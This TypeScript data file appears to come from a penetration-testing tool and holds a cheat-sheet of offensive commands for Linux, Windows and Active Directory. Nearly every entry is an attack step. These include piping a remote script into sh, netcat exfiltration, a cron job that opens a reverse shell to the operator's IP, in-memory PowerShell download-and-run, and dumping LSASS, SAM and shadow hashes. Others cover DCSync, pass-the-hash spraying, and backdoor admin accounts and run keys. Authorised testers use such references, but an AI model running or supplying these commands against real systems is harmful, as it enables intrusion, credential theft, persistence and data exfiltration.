/**
 * Command Library — the Linux and Windows commands operators reach for, grouped
 * by intent and in the order you actually need them. Structured data; adding a
 * command is a data entry. Placeholders fill from the Variable Console.
 */
export interface Cmd { cmd: string; desc: string; note?: string }
export interface CmdGroup { id: string; title: string; commands: Cmd[] }
export interface CmdPlatform { id: string; title: string; groups: CmdGroup[] }

export const COMMAND_LIBRARY: CmdPlatform[] = [
  {
    id: 'recon', title: 'Recon & Enumeration',
    groups: [
      { id: 'recon-ports', title: 'Port Scanning', commands: [
        { cmd: 'nmap -p- --min-rate 5000 -T4 <TARGET-IP> -oN ports.txt', desc: 'All 65535 TCP ports, fast, saved' },
        { cmd: 'nmap -sCV -p$(grep ^[0-9] ports.txt | cut -d/ -f1 | paste -sd,) <TARGET-IP>', desc: 'Version + default scripts on only the open ports' },
        { cmd: 'nmap -sU --top-ports 100 <TARGET-IP>', desc: 'Top UDP ports (SNMP, DNS, TFTP, IKE hide here)' },
        { cmd: 'nmap --script vuln -p<PORTS> <TARGET-IP>', desc: 'Known-vuln scripts on the interesting ports' },
        { cmd: 'nmap -sn <RANGE>', desc: 'Host discovery (ping sweep) across a subnet' },
      ] },
      { id: 'recon-web', title: 'Web Enumeration', commands: [
        { cmd: 'whatweb -a 3 http://<TARGET-IP>', desc: 'Stack, framework, CMS, and versions' },
        { cmd: 'ffuf -u http://<TARGET-IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403', desc: 'Directory and file discovery' },
        { cmd: 'ffuf -u http://<TARGET-IP> -H "Host: FUZZ.<TARGET-IP>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0', desc: 'Virtual host discovery' },
        { cmd: 'ffuf -u "http://<TARGET-IP>/?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0', desc: 'Hidden parameter discovery' },
        { cmd: 'nikto -h http://<TARGET-IP>', desc: 'Default files, dangerous methods, known issues' },
        { cmd: 'wpscan --url http://<TARGET-IP> --enumerate vp,u', desc: 'WordPress vulnerable plugins + user enumeration' },
      ] },
      { id: 'recon-services', title: 'Service Enumeration', commands: [
        { cmd: 'netexec smb <TARGET-IP> -u "" -p "" --shares', desc: 'SMB null-session share listing' },
        { cmd: 'enum4linux-ng -A <TARGET-IP>', desc: 'SMB users / groups / shares / policy in one pass' },
        { cmd: 'snmpwalk -v2c -c public <TARGET-IP>', desc: 'Public SNMP: processes, users, sometimes creds' },
        { cmd: 'showmount -e <TARGET-IP>', desc: 'Exported NFS shares (look for no_root_squash)' },
        { cmd: 'dig axfr @<TARGET-IP> <YOUR-DOMAIN>', desc: 'DNS zone transfer attempt' },
      ] },
    ],
  },
  {
    id: 'linux', title: 'Linux',
    groups: [
      { id: 'linux-enum', title: 'Enumeration', commands: [
        { cmd: 'id && whoami && hostname', desc: 'Who am I, and where' },
        { cmd: 'uname -a && cat /etc/os-release', desc: 'Kernel and distro (for kernel exploits)' },
        { cmd: 'sudo -l', desc: 'What can I run as sudo (check GTFOBins for each)' },
        { cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: 'SUID binaries (privesc leads)' },
        { cmd: 'find / -perm -2000 -type f 2>/dev/null', desc: 'SGID binaries' },
        { cmd: 'getcap -r / 2>/dev/null', desc: 'Files with capabilities (cap_setuid etc.)' },
        { cmd: 'cat /etc/crontab; ls -la /etc/cron*', desc: 'Scheduled jobs (writable script = root)' },
        { cmd: 'ss -tlnp || netstat -tulpn', desc: 'Listening services (internal privesc leads)' },
        { cmd: 'ps auxww', desc: 'Running processes (look for root running your stuff)' },
      ] },
      { id: 'linux-privesc', title: 'Privilege Escalation', commands: [
        { cmd: 'find / -writable -type d 2>/dev/null', desc: 'Writable directories' },
        { cmd: "find / -writable ! -user `whoami` -type f -not -path '/proc/*' 2>/dev/null", desc: 'Files you can write but do not own' },
        { cmd: 'curl http://<YOUR-IP>:<LPORT>/linpeas.sh | sh', desc: 'Run LinPEAS in memory (no disk write)' },
        { cmd: 'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers', desc: 'If /etc/sudoers is writable' },
        { cmd: "openssl passwd -1 -salt x pass123", desc: 'Make a hash to add a root line to /etc/passwd (if writable)' },
        { cmd: 'uname -r', desc: 'Kernel version, then: searchsploit linux kernel <it>' },
      ] },
      { id: 'linux-creds', title: 'Credential Access', commands: [
        { cmd: 'cat /etc/shadow', desc: 'Password hashes (if readable = misconfig)' },
        { cmd: "grep -riE 'password|passwd|secret|api_key' /etc /var/www /home 2>/dev/null", desc: 'Hunt creds in config files' },
        { cmd: 'find / -name "id_rsa" -o -name "*.pem" 2>/dev/null', desc: 'SSH private keys' },
        { cmd: 'cat ~/.bash_history ~/.mysql_history 2>/dev/null', desc: 'History files (creds get typed)' },
        { cmd: 'find / -name "*.kdbx" -o -name "*.ovpn" 2>/dev/null', desc: 'KeePass DBs / VPN configs' },
      ] },
      { id: 'linux-transfer', title: 'File Transfer', commands: [
        { cmd: 'python3 -m http.server <LPORT>', desc: 'Serve files from your box (attacker)' },
        { cmd: 'wget http://<YOUR-IP>:<LPORT>/file -O /tmp/file', desc: 'Pull a file (victim)' },
        { cmd: 'curl http://<YOUR-IP>:<LPORT>/file -o /tmp/file', desc: 'Pull a file with curl' },
        { cmd: 'nc -lvnp <LPORT> > loot.tar; # victim: nc <YOUR-IP> <LPORT> < file', desc: 'Netcat exfil' },
        { cmd: 'base64 -w0 /etc/shadow', desc: 'Encode to copy-paste when no network' },
      ] },
      { id: 'linux-pivot', title: 'Pivoting & Tunneling', commands: [
        { cmd: 'ssh -L 8080:127.0.0.1:80 <USER>@<TARGET-IP>', desc: 'Local port forward (reach an internal service)' },
        { cmd: 'ssh -R 9001:127.0.0.1:9001 <USER>@<YOUR-IP>', desc: 'Remote forward (bring a victim port to you)' },
        { cmd: 'ssh -D 1080 <USER>@<TARGET-IP>', desc: 'Dynamic SOCKS proxy (then use proxychains)' },
        { cmd: './chisel server -p <LPORT> --reverse # victim: ./chisel client <YOUR-IP>:<LPORT> R:socks', desc: 'Chisel reverse SOCKS (no SSH needed)' },
      ] },
      { id: 'linux-persist', title: 'Persistence', commands: [
        { cmd: 'echo "ssh-rsa AAAA... you" >> ~/.ssh/authorized_keys', desc: 'Add your key for SSH-back' },
        { cmd: '(crontab -l; echo "* * * * * bash -i >& /dev/tcp/<YOUR-IP>/<LPORT> 0>&1") | crontab -', desc: 'Cron reverse shell every minute' },
      ] },
    ],
  },
  {
    id: 'windows', title: 'Windows',
    groups: [
      { id: 'win-enum', title: 'Enumeration', commands: [
        { cmd: 'whoami /all', desc: 'User, groups, and privileges in one shot' },
        { cmd: 'whoami /priv', desc: 'Token privileges (SeImpersonate = SYSTEM path)' },
        { cmd: 'systeminfo', desc: 'OS, patches, arch (for kernel/priv exploits)' },
        { cmd: 'net user && net localgroup administrators', desc: 'Local users and admins' },
        { cmd: 'ipconfig /all && arp -a', desc: 'Network layout and neighbours' },
        { cmd: 'netstat -ano', desc: 'Connections and listening ports (internal leads)' },
        { cmd: 'wmic service get name,displayname,pathname,startname | findstr /i /v "C:\\Windows"', desc: 'Non-Windows services (unquoted-path / weak-perms leads)' },
        { cmd: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', desc: 'AlwaysInstallElevated (1 = free SYSTEM via MSI)' },
      ] },
      { id: 'win-privesc', title: 'Privilege Escalation', commands: [
        { cmd: 'whoami /priv | findstr /i "Impersonate AssignPrimary"', desc: 'If Enabled -> Potato attack to SYSTEM' },
        { cmd: '.\\GodPotato.exe -cmd "cmd /c whoami"', desc: 'SeImpersonate -> SYSTEM (2016-2022, Win 8-11)' },
        { cmd: '.\\winPEASx64.exe', desc: 'Automated privesc enum (RED = exploitable)' },
        { cmd: 'msiexec /quiet /qn /i C:\\Temp\\shell.msi', desc: 'Run an MSI as SYSTEM (AlwaysInstallElevated)' },
        { cmd: 'sc qc <SERVICE-NAME>', desc: 'Inspect a service (unquoted path / weak binpath)' },
      ] },
      { id: 'win-creds', title: 'Credential Access', commands: [
        { cmd: 'reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive', desc: 'Dump SAM+SYSTEM (crack offline with secretsdump)' },
        { cmd: 'cmdkey /list', desc: 'Saved credentials (then runas /savecred)' },
        { cmd: 'rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <PID> C:\\Temp\\lsass.dmp full', desc: 'Dump LSASS (extract creds offline)' },
        { cmd: 'findstr /si password *.txt *.ini *.config *.xml', desc: 'Hunt plaintext creds in files' },
        { cmd: 'lsadump::dcsync /domain:<DOMAIN> /user:krbtgt', desc: 'DCSync krbtgt (Mimikatz, needs replication rights)' },
      ] },
      { id: 'win-transfer', title: 'File Transfer', commands: [
        { cmd: 'certutil -urlcache -split -f http://<YOUR-IP>:<LPORT>/nc.exe C:\\Windows\\Temp\\nc.exe', desc: 'Download with certutil (always present)' },
        { cmd: '(New-Object System.Net.WebClient).DownloadFile("http://<YOUR-IP>:<LPORT>/f.exe","C:\\Temp\\f.exe")', desc: 'PowerShell download to disk' },
        { cmd: 'IEX(New-Object Net.WebClient).DownloadString("http://<YOUR-IP>:<LPORT>/s.ps1")', desc: 'Run a script in memory (no disk)' },
        { cmd: 'copy \\\\<YOUR-IP>\\share\\nc.exe C:\\Temp\\nc.exe', desc: 'SMB copy (host with impacket-smbserver)' },
      ] },
      { id: 'win-pivot', title: 'Pivoting & Tunneling', commands: [
        { cmd: 'netsh interface portproxy add v4tov4 listenport=8080 connectaddress=127.0.0.1 connectport=80', desc: 'Native port forward on the target' },
        { cmd: '.\\chisel.exe client <YOUR-IP>:<LPORT> R:socks', desc: 'Chisel reverse SOCKS back to you' },
      ] },
      { id: 'win-persist', title: 'Persistence', commands: [
        { cmd: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc /d "C:\\Temp\\shell.exe"', desc: 'Run key (runs at logon)' },
        { cmd: 'schtasks /create /tn "svc" /tr "C:\\Temp\\shell.exe" /sc onlogon /ru SYSTEM', desc: 'Scheduled task as SYSTEM at logon' },
        { cmd: 'net user hacker Passw0rd! /add && net localgroup administrators hacker /add', desc: 'New local admin' },
      ] },
    ],
  },
  {
    id: 'ad', title: 'Active Directory',
    groups: [
      { id: 'ad-enum', title: 'Enumeration', commands: [
        { cmd: 'netexec smb <DC-IP> -u <USER> -p <PASS> --users --groups --shares', desc: 'Domain users, groups, and shares over SMB' },
        { cmd: 'netexec ldap <DC-IP> -u <USER> -p <PASS> --bloodhound --collection All', desc: 'Collect BloodHound data straight from netexec' },
        { cmd: 'bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC-IP> -c all', desc: 'BloodHound collection (Python ingestor), then import the zips' },
        { cmd: 'ldapsearch -x -H ldap://<DC-IP> -D "<USER>@<DOMAIN>" -w <PASS> -b "DC=<DOMAIN>"', desc: 'Raw LDAP dump' },
        { cmd: 'enum4linux-ng -A <DC-IP>', desc: 'One-shot users / groups / shares / policy' },
      ] },
      { id: 'ad-kerberos', title: 'Kerberos Attacks', commands: [
        { cmd: 'netexec ldap <DC-IP> -u users.txt -p "" --asreproast asrep.txt', desc: 'AS-REP roast accounts without Kerberos pre-auth' },
        { cmd: 'impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP> -request', desc: 'Kerberoast: service-account TGS for offline cracking' },
        { cmd: 'hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt', desc: 'Crack Kerberoast hashes (AS-REP roast = -m 18200)' },
        { cmd: 'impacket-getTGT <DOMAIN>/<USER>:<PASS> -dc-ip <DC-IP>', desc: 'Request a TGT, then: export KRB5CCNAME=<USER>.ccache' },
      ] },
      { id: 'ad-dump', title: 'Credential Dumping', commands: [
        { cmd: 'netexec smb <RANGE> -u <USER> -p <PASS> --sam --lsa', desc: 'Dump SAM + LSA secrets across the subnet' },
        { cmd: 'impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC-IP> -just-dc', desc: 'DCSync all domain hashes (needs replication rights)' },
        { cmd: 'netexec smb <RANGE> -u <USER> -H <NTLM-HASH> -M lsassy', desc: 'Pass-the-hash + dump LSASS remotely (lsassy module)' },
      ] },
      { id: 'ad-lateral', title: 'Lateral Movement', commands: [
        { cmd: 'evil-winrm -i <TARGET-IP> -u <USER> -p <PASS>', desc: 'Interactive WinRM shell (or -H <NTLM-HASH> for pass-the-hash)' },
        { cmd: 'impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET-IP>', desc: 'Semi-interactive shell via WMI (quieter than psexec)' },
        { cmd: 'impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET-IP>', desc: 'SYSTEM shell via SMB (reliable but noisy)' },
        { cmd: 'netexec smb <RANGE> -u <USER> -H <NTLM-HASH>', desc: 'Spray a hash across the subnet (Pwned! = local admin)' },
      ] },
    ],
  },
];
